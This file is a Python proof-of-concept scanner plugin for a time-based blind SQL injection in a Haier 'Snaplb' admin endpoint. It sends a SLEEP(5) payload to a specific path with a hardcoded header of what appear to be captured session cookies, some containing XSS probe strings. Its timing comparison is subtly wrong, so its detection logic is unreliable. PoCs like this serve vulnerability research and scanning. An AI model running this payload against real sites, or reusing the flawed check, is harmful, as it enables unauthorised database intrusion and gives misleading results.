# coding:utf-8
import time
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Snaplb_0101' # 平台漏洞编号
    name = '海尔集团SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-06-27'  # 漏洞公布时间
    desc = '''模版漏洞描述
    海尔集团SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=207601
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Snaplb'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '65a27d67-86ca-46ac-b85c-a168638f3e60' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/snaplb/admin/menulevelservice/getinfo/menulevel.ajax"
            payload = "codeType=1' AND (SELECT * FROM (SELECT(SLEEP(5)))Nedn) AND 'HQMz'='HQMz&codeTypeName=&parent="
            payload1 = "codeType=1&codeTypeName=&parent="
            header = {
                'Content-Length': '353',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie':'''JSESSIONID=A70D0B53354901BACB9BEFBF6866FE49; rrs.com_ehaier_sessionid=67682DA5C5ACB656F9F9F724D2EF1C6E; rrs.com_ehaier_refererUrl="aHR0cDovL20ucnJzLmNvbS8="; rrs.com_ehaier_loginReturnUrl="aHR0cDovL20ucnJzLmNvbS9zaHVpL21vYmlsZS9waW5nYW4="; RRSSESS=e7g34t86s7gkebgnsivfjeam91; laravel_session=eyJpdiI6IlFJVTZYV2FYZFwvckdzT3lhcWI1b1l3PT0iLCJ2YWx1ZSI6IjhENXdiUXp3V2h1RTlYWk1jbTFsRnlZaVNBZnBBOXZhdlwvNXFraTlLVnlrV3Zzc2dYejdqYlRDTWlsbGlIcU80aWIycGI2QnplSXJrQzlBSzRWQWduQT09IiwibWFjIjoiNmYyMzdiZTUzNzg3ZmZkZmNlZmRlMDQ0Y2QxNDQ1NWRmOGQwYzhlY2I5ZGQ3ZGI5ODI1NzBlZGM2NzFiZTFiYiJ9; JSESSIONID=A70D0B53354901BACB9BEFBF6866FE49; ZXKJSESSIONID=43735fe5-ef4a-e052-6670-2147048924e1***1; UniqueName=43735fe5-ef4a-e052-6670-2147048924e1; Hm_lvt_e1b611e8ea607634925d9684f4e559e5=1462826878,1462827087,1462827310,1462827460; Hm_lpvt_e1b611e8ea607634925d9684f4e559e5=1462827460; _jzqa=1.4547732553112906000.1462826785.1462826785.1462826785.1; _jzqc=1; _jzqx=1.1462826785.1462826785.1.jzqsr=acunetix-referrer%2Ecom|jzqct=/javascript:domxssexecutionsink(0,"'\"><xsstag>()refdxss").-; _jzqckmp=1; _jzqb=1.11.10.1462826785.1; _qzja=1.668047106.1462826784881.1462826784881.1462826784881.1462830158492.1462830163560.%257B%257B_USER__name%257D%257D.1.0.20.1; _qzjb=1.1462826784881.20.0.0.0; _qzjc=1; _qzjto=20.1.0; HMACCOUNT=7A72A504167B356C; BAIDUID=D80BD201682D349E65CF00516B739F4C:FG=1; _gsref_113428431=http://www.acunetix-referrer.com/javascript:domxssExecutionSink(0,"'\"><xsstag>()refdxss"); _gscu_113428431=628268849w7j6y11; _gscs_113428431=62826884n31uwd11|pv:2; _gscbrs_113428431=1; NTKF_T2D_CLIENTID=guest578715F5-7A49-1619-68E7-C0CA6B804B6F; nTalk_CACHE_DATA={uid:he_1000_ISME9754_guest578715F5-7A49-16,tid:1462826909284801,opd:1}; Hm_lvt_504222469397f794ea8da61f8a4e10e2=1462829913,1462830158,1462830164,1462830412; Hm_lpvt_504222469397f794ea8da61f8a4e10e2=1462830412; nTalk_PAGE_MANAGE={|m|:[{|02026|:|270020|}],|t|:|04:50:02|}; SERVERID=4b4a76f761b5f05d5ba1368c620770ae|1462895108|1462895108; avr_137032388_0_0_4294901760_271286987_0=1854756157_60071446; Hm_lvt_972125b56f85b5c6ce2c83fd9305649e=1462829558,1462829669,1462829683,1462829913; Hm_lpvt_972125b56f85b5c6ce2c83fd9305649e=1462829913; __xsptplus163=163.1.1462828448.1462829913.12%233%7Cwww.acunetix-referrer.com%7C%7C%7C%7C%23%235CBGDdxBfWnucW7rlM1gtDfyRlm8qHDR%23; zid=a5a3a470f97a661e2b635fb6b309c9af; _pzfxuvpc=1462828582822%7C1416075934140965094%7C11%7C1462829913491%7C1%7C%7C1200018089110423045; _pzfxsvpc=1200018089110423045%7C1462828582822%7C11%7Chttp%3A%2F%2Fwww.acunetix-referrer.com%2Fjavascript%3AdomxssExecutionSink(0%2C%22'%5C%22%3E%3Cxsstag%3E()refdxss%22)''',
                'Connection': 'Keep-alive',
                'Accept-Encoding': 'gzip,deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
                'Accept': '*/*'
            }
            start_time1 =time.time()
            _response = requests.post(url,headers=header, data=payload)
            end_time1 =time.time()
            _response = requests.post(url,headers=header, data=payload1)
            end_time2 =time.time() 
            if (end_time1-start_time1) - (end_time2-start_time1) >= 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()
if __name__ == '__main__':
    Poc().run()
